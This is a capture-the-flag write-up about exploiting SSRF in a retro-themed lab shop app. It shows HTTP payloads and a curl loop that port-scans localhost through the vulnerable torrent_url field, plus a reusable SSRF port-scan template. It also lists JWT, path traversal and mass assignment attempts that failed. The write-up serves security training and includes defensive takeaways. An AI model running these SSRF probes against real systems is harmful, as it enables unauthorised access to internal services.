- SSRF via a LimeWire file download feature, pivoting to an undocumented internal admin service on a different port
- The lesson: when you find SSRF, enumerate ports immediately. Don't tunnel vision on the one port you already know about.
- **Difficulty:** Medium
- **Theme:** 90s HackersParadise underground mall (Matrix/retro hacker aesthetic)

## TL;DR

SSRF in `/api/limewire/download` (`torrent_url` field) allows fetching from internal services. URL validation only checks hostname (`localhost`) but doesn't restrict ports. Port 4001 hosts an admin service with the flag at `/admin/flag.txt`.

**Attack Chain:**
```
Read JS files -> discover torrent_url points to localhost:4000 -> confirm SSRF -> enumerate ports -> find admin service on 4001 -> /admin/flag.txt -> flag
```

## 1. Reconnaissance

### App Overview

The app is a 90s-themed underground shop called "HackersParadise" running on Express.js (hybrid SSR + static HTML pages). Features:

- Shopping (products paid via "calling cards")
- LimeWire-style file sharing/download
- Guestbook
- Profile management
- Admin console (RedPill) -> role-gated

### Initial Discovery

`pentest-init-flow` finds 3 API endpoints and 2 JS files:

```
API ENDPOINTS:
  /api/auth/me [GET]
  /api/orders [POST]
  /api/products [GET]

JS FILES:
  /js/app.js
  /js/shop.js
```

But by crawling the HTML pages, many more JS files surface:

| File | Referenced from |
|------|----------------|
| `/js/app.js` | Every page (nav, cart, footer) |
| `/js/shop.js` | index.html (product grid) |
| `/js/auth.js` | login.html |
| `/js/register.js` | register.html |
| `/js/profile.js` | profile.html |
| `/js/guestbook.js` | guestbook.html |
| `/js/limewire.js` | limewire.html |
| `/js/redpillconsole.js` | redpillconsole.html |

---

## 2. Reading the JS Files

### Key Finding #1: Role System (app.js)

```javascript
// app.js - line 766
if (user && user.role === 'redpill') {
    const rpBtn = document.createElement('a');
    rpBtn.href = '/redpillconsole.html';
    rpBtn.textContent = '💊 RedPill';
    nav.appendChild(rpBtn);
}
```

The admin role is `redpill`. Normal users get `bluepill`.

### Key Finding #2: SSRF Vector (limewire.js)

```javascript
// limewire.js - triggerDownload function
async function triggerDownload(file) {
    const token = localStorage.getItem('token');
    const res = await fetch('/api/limewire/download', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + token
        },
        body: JSON.stringify({ torrent_url: file.torrent_url })
    });
    return res.json();
}
```

The download endpoint takes a `torrent_url` and makes a server-side fetch. Checking the file listing:

```json
GET /api/limewire/files

{
  "files": [
    {
      "filename": "The_Matrix_1999_DVDRip.avi",
      "torrent_url": "http://localhost:4000/torrent/download/The_Matrix_1999_DVDRip.avi"
    },
    ...
  ]
}
```

The `torrent_url` points to `http://localhost:4000/...` -> an internal service.

### Key Finding #3: Admin API Endpoints (redpillconsole.js)

```javascript
// redpillconsole.js
async function loadStats() {
    const data = await apiFetch('/api/redpillconsole/stats');
}
async function loadUsers() {
    const data = await apiFetch('/api/redpillconsole/users');
}
async function loadOrders() {
    const data = await apiFetch('/api/redpillconsole/orders');
}
```

These require `redpill` role server-side (confirmed: returns 403 with a bluepill token).

### Key Finding #4: Additional API Endpoints

- `/api/auth/login` (auth.js)
- `/api/auth/register` (register.js)
- `/api/auth/change-password` (profile.js)
- `/api/guestbook` GET/POST (guestbook.js)
- `/api/limewire/files` (limewire.js)
- `/api/limewire/download` (limewire.js) -- the SSRF vector

---

## 3. SSRF Confirmation

### Testing the SSRF

```http
POST /api/limewire/download HTTP/1.1
Host: <LAB>
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"torrent_url":"http://localhost:4000/"}
```

Response:
```json
{
  "success": true,
  "data": {
    "status": "online",
    "endpoints": ["/torrent", "/redpillconsole", "/rabbithole"]
  }
}
```

SSRF confirmed. The server fetches from `localhost:4000` and returns the JSON response.

### URL Validation

The endpoint validates the URL:
- `http://localhost:3000/...` -- "Invalid service URL" (400)
- `http://127.0.0.1:3000/...` -- "Invalid service URL" (400)
- `http://localhost:4000/...` -- Works (200)
- `http://localhost:4001/...` -- Works (200) **<-- The bypass**

The validation checks that the host is `localhost` but does NOT restrict the port to 4000 only.

---

## 4. Port Enumeration - The Key Step

Once SSRF was confirmed, the next question: what's actually validated? A batch port scan via the SSRF vector reveals the answer immediately. Fuzz `localhost:<PORT>/` across common ports:

```bash
# Port scan via SSRF - one curl per port, filter by HTTP status
for port in 3000 3001 4000 4001 4002 5000 5432 6379 8080 9000 9090 27017; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    https://<LAB>/api/limewire/download \
    -H "Authorization: Bearer <TOKEN>" \
    -H "Content-Type: application/json" \
    -d "{\"torrent_url\":\"http://localhost:$port/\"}")
  echo "Port $port: $status"
done
```

Results:

| Port | Status | Response Body | Interpretation |
|------|--------|---------------|----------------|
| 3000 | 400 | "Invalid service URL" | Blocked by validator |
| 3001 | 400 | "Invalid service URL" | Blocked by validator |
| **4000** | **200** | `{"status":"online","endpoints":["/torrent","/redpillconsole","/rabbithole"]}` | Known torrent service |
| **4001** | **200** | `{"status":"online","clearence-level":"admin"}` | Admin service -- no auth |
| 4002 | 400 | "Invalid service URL" | Blocked by validator |
| 5000-27017 | 400 | "Invalid service URL" | All blocked |

The validator allows a port range (4000-4001) rather than any arbitrary port. But the developer forgot that port 4001 hosts a separate admin service with no authentication. No fragment bypass, no URL encoding tricks -- just the next port over.

The winning request:

```http
POST /api/limewire/download HTTP/1.1
Host: <LAB>
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"torrent_url":"http://localhost:4001/"}
```

Response:
```json
{
  "success": true,
  "data": {
    "status": "online",
    "clearence-level": "admin"
  }
}
```

Port 4001 has an admin service with no authentication!

### Enumerating Port 4001

```http
{"torrent_url":"http://localhost:4001/admin/flag"}
```
Response: `{"error":"You're so close"}`

```http
{"torrent_url":"http://localhost:4001/admin/flag.txt"}
```
Response:
```json
{
  "success": true,
  "data": {
    "flag": "bug{W59H9EumcpmN3F2aL2iNixQWV3X8ooGe}"
  }
}
```

## 5. Flag

```
bug{W59H9EumcpmN3F2aL2iNixQWV3X8ooGe}
```

## 6. Dead Ends - What Didn't Work

These are rabbit holes I spent time on before finding port 4001:

### Port 4000 Internal Endpoints

| Path | Response |
|------|----------|
| `/redpillconsole` | endpoints: /stats, /users, /orders |
| `/redpillconsole/stats` | "Not Authorized" |
| `/redpillconsole/orders` | "Not Authorized" |
| `/redpillconsole/users` | endpoints: /:id/password |
| `/redpillconsole/users/1/password` | "Really? Password for 1?" (taunt) |
| `/rabbithole` | "How deep does the rabbit hole go?" (taunt) |
| `/rabbithole/secret` | "Endpoint not available" |
| `/rabbithole/flag` | "Endpoint not available" |

All rabbit holes. Port 4000's redpillconsole endpoints require auth that can't be bypassed via SSRF.

### Path Traversal on Torrent Download

```
http://localhost:4000/torrent/download/..%2F..%2Fserver.js
```

Returns "File not found" -> the traversal works (URL encoding bypasses the router) but there's no file at that path. I tried dozens of filenames. None existed.

### JWT Attacks

- `alg:none` -- rejected (401)
- Common secrets (secret, password, 123456, hackersparadise, redpill, matrix) -- all rejected

### Mass Assignment on Register

```json
POST /api/auth/register
{"username":"test","password":"test","role":"redpill"}
```

Role ignored -- always assigns `bluepill`.

### Change-Password IDOR

```json
POST /api/auth/change-password
{"newPassword":"x","id":1}
```

Always says "Password updated" but only changes the requesting user's password. Extra fields ignored.

## 7. What I Should Have Done Differently

### The Failure

I found the SSRF in under 2 minutes. I then spent 40+ minutes exclusively hammering port 4000 - path traversal, rabbit hole endpoints, redpillconsole auth bypass, JWT tampering... all dead ends.

The fix was trivial: **try other ports.**

### SSRF Port Scanning Should Be Step 1

When you confirm SSRF to an internal service, the very next thing to test is:

1. **What other ports are reachable?** (4001, 4002, 5000, 8080, 9000...)
2. What validation is actually enforced? (host only? host+port? path prefix?)
3. Are redirects followed?

I confirmed the URL check rejected `localhost:3000` (400) but never tested `localhost:4001`. That's a 1-request test that would have solved the lab immediately.

### Rule for Future

After confirming SSRF with URL validation:
1. Test what's actually validated (host? port? scheme? path?)
2. Test adjacent ports (port +/- 1, common service ports)
3. Don't spend more than 5 minutes on one port before checking others

---

## 8. Security Takeaways

1. **Port scan immediately after SSRF confirmation.** The moment you confirm a server-side fetch, batch-fuzz the port number before deep-diving any single service. A 12-port scan takes 2 seconds and eliminates hours of rabbit holes.

2. **Allowlist != single value.** The validator here allowed a port range (4000-4001), not just the intended service port. Developers often allowlist broader than necessary -- regex `localhost:4\d{3}` instead of exact `localhost:4000`. Always probe the boundaries of what the filter actually permits.

3. **Adjacent ports host adjacent services.** Microservice architectures commonly bind related services on sequential ports (app:3000, admin:3001, metrics:9090). When you find one internal service, the next port over is the highest-priority guess.

4. **No fragment bypass needed.** The Discord discussion asked about `#` fragment bypass -- that's unnecessary here. The filter checks hostname only, leaving the port field wide open. Don't over-engineer the bypass before understanding what's actually validated.

5. **Internal admin services skip auth.** Port 4001's admin service required zero authentication because it was "only reachable internally." SSRF turns that assumption into a vulnerability. Any internal service reachable via SSRF should be treated as externally exposed.

### Vulnerability Classes

| # | Vulnerability | Impact |
|---|--------------|--------|
| 1 | SSRF (server-side fetch via `torrent_url`) | Access to internal services |
| 2 | Overly permissive URL allowlist (port range vs exact port) | Pivot to unintended services |
| 3 | Unauthenticated internal admin service | Full admin access via SSRF chain |

### SSRF Port Scanning Methodology

```bash
# Quick port scan template via SSRF
# Adapt the endpoint/field to match the target's fetch mechanism
for port in 3000 3001 4000 4001 4002 5000 5432 6379 8000 8080 9000 9090 27017; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    https://<TARGET>/api/<ssrf-endpoint> \
    -H "Authorization: Bearer <TOKEN>" \
    -H "Content-Type: application/json" \
    -d "{\"url_field\":\"http://localhost:$port/\"}")
  echo "Port $port: HTTP $status"
done

# Differentiation:
# 200 = internal service responded (OPEN)
# 400 = blocked by URL validator (FILTERED)
# 500 = connection refused / timeout (CLOSED)
# Response body length differences = different services on different ports
```
